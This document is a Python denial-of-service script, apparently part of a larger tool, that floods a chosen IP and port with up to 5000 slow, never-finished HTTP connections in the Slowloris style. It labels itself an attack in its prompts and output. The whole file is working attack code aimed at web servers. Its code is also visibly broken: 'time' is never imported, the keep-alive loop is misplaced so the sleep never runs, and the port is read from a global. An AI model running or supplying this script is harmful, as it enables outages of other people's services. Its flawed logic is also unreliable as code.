#!/usr/bin/env python
import random
import socket
from pathlib import Path

from distlib.compat import raw_input

headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en"
]

sockets = []
def existIpFile():
    path_to_file = 'ip.txt'
    path = Path(path_to_file)
    if path.is_file():
        print(" => File ip.txt exist\n")
    else:
        print(" File ip.txt doesn't exist, select option (5) to create a range of target ip before Ddos attack")
        exit(0)
def setupSocket(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    sock.connect((ip, int(targetPort)))
    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))

    for header in headers:
        sock.send("{}\r\n".format(header).encode("utf-8"))

    return sock


if __name__ == "__main__":
    existIpFile()
    fichier = open("ip.txt", "r")

    for ligne in fichier:
          a = ligne
          b = a.split()
          for i in range(len(b)):
              c = b[i]
              print(" Target Ip : " + c)

fichier.close()
print(" ")
ip = raw_input(" Put one Target Ip => ")
targetPort = raw_input(" What port to attack ? => ")
count = 5000
print(" Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))

for _ in range(count):
    try:
        print(" Socket {}".format(_))
        sock = setupSocket(ip)
    except socket.error:
        break

    sockets.append(sock)

    while True:
        print(" Connected to {} sockets. Sending headers...".format(len(sockets)))

        for sock in list(sockets):
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
            except socket.error:
                sockets.remove(sock)

        for _ in range(count - len(sockets)):
            print(" Re-opening closed sockets...")
            try:
                sock = setupSocket(ip)
                if sock:
                    sockets.append(sock)
            except socket.error:
                break

    time.sleep(15)
